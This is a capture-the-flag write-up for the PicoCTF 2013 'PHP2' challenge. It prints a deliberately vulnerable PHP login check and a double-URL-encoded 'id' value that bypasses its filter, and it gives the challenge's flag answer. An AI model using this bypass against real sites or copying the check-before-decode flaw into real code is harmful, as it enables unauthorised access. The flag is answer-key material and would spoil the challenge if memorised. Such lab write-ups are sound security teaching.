# PicoCTF 2013: PHP2

**Category:** Script Exploitation
**Points:** 90
**Description:**

> We found a [simple web page](https://2013.picoctf.com/problems/php2/) that seems to want us to authenticate, but we can't figure out how... can you?

## Write-up
> In this challenge we're exploiting a simple PHP script. Our goal is to get the flag to print. 
> We can find the script's source at [https://2013.picoctf.com/problems/php2/index.phps](https://2013.picoctf.com/problems/php2/index.phps)
> Our script:

```
<?
if(eregi("admin",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </p>";
}
?>


<br><br>
Can you authenticate to this website?
<!-- source: index.phps -->
```
> The script first calls ergi() to see if the GET variable 'id' equals 'admin'. If it does then it exits . 
> The script then calls urldecode() on the 'id' variable and then checks to see if that equals 'admin'. 
> We can exploit the script by URL encoding the word 'admin' (using the chart [here](http://www.w3schools.com/tags/ref_urlencode.asp) then using the encoded word as the id variable .
> Note we also need to encode the % sign because there are one character url encodes (i.e. %8 is backspace).
> Solution:
> https://2013.picoctf.com/problems/php2/index.php?id=%2561%2564%256d%2569%256e

**Answer: b4cc845aa05ed9b0ce823cb04f253e27** 

## Other write-ups and resources

* [https://github.com/BatmansKitchen/ctf-writeups/tree/master/2013-picoctf/PHP2](https://github.com/BatmansKitchen/ctf-writeups/tree/master/2013-picoctf/PHP2)
* [https://github.com/innoying/hydrantlabs.org-old/blob/master/content/Security/picoCTF/2013/PHP2/index.jade](https://github.com/innoying/hydrantlabs.org-old/blob/master/content/Security/picoCTF/2013/PHP2/index.jade)
